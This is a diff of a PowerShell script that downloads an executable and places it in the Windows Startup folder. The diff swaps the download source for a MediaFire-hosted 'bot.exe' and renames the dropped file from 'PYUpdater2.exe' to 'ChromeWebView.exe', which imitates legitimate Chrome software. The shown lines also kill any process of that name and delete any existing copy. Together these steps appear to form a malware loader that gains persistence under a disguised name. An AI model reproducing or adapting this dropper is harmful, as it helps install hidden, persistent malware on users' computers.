@@ -37,13 +37,13 @@ if ($process) {
     Write-Host ""
 }
 
-$url = "https://github.com/HadronCollsion/Chuha/releases/download/v1.0/release.exe"
+$url = "https://download1349.mediafire.com/2yjwmr0deycgVAY-rMScOBc7OQD-Ir8eNVjTxLQwqqC6L3vsCzUAEcsstIwgECao8UoNicVLgBvj7qoqWMts1QSXKsvkeiORCIU3bDYle-oiZi7-cpphGIqE_Exda9RmTEBcXL721LpN8baVkC4_VPl76hCt0U62Gj39H71_BFQqf6g/09vxfy68cwf7cim/bot.exe"
 $dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-$fn = "PYUpdater2.exe"
+$fn = "ChromeWebView.exe"
 $fp = Join-Path -Path $dest -ChildPath $fn
 
-if (Get-Process -Name "PYUpdater" -ErrorAction SilentlyContinue) {
-    Stop-Process -Name "PYUpdater" -Force
+if (Get-Process -Name "ChromeWebView" -ErrorAction SilentlyContinue) {
+    Stop-Process -Name "ChromeWebView" -Force
 }
 if (Test-Path -Path $fp) {
     Remove-Item -Path $fp -Force
